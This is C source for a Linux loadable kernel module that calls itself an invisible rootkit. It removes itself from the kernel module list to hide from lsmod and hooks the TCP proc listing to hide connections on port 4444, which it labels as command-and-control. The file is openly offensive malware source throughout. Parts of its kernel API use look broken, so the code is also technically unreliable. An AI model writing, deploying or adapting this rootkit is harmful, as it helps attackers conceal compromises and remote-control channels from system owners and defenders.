// vivisect_lkm.c — THE FINAL BOSS

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/inet.h>

#define C2_PORT 4444
#define HIDE_PORT 4444

static int hidden_pid = -1;
static int hide_tcp = 1;

module_param(hidden_pid, int, 0);
module_param(hide_tcp, int, 0);

// Save original functions
static struct list_head *prev_module;
static struct list_head *next_module;
static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static int vivisect_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct tcp_iter_state *st = seq->private;
    struct sock *sk = v;

    if (v == SEQ_START_TOKEN) {
        return orig_tcp4_seq_show(seq, v);
    }

    if (hide_tcp && sk) {
        if (sk->sk_num == HIDE_PORT || sk->sk_dport == htons(HIDE_PORT)) {
            return 0;  // Skip this connection
        }
    }

    return orig_tcp4_seq_show(seq, v);
}

// Hide from lsmod
static void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    next_module = THIS_MODULE->list.next;
    list_del(&THIS_MODULE->list);
}

static void show_module(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

// Hook tcp4_seq_show
static void hook_tcp_seq(void)
{
    struct proc_dir_entry *entry = proc_net_fops_create(&init_net, "tcp", 0, &tcp4_seq_ops);
    if (entry && entry->proc_fops) {
        orig_tcp4_seq_show = entry->proc_fops->read;
        entry->proc_fops->read = (void *)vivisect_tcp4_seq_show;
    }
}

static int __init vivisect_init(void)
{
    hide_module();
    hook_tcp_seq();
    printk(KERN_INFO "VIVISECT LKM loaded — invisible rootkit active\n");
    return 0;
}

static void __exit vivisect_exit(void)
{
    show_module();
    printk(KERN_INFO "VIVISECT LKM unloaded\n");
}

module_init(vivisect_init);
module_exit(vivisect_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("VIVISECT");
MODULE_DESCRIPTION("Advanced offensive persistence and stealth");
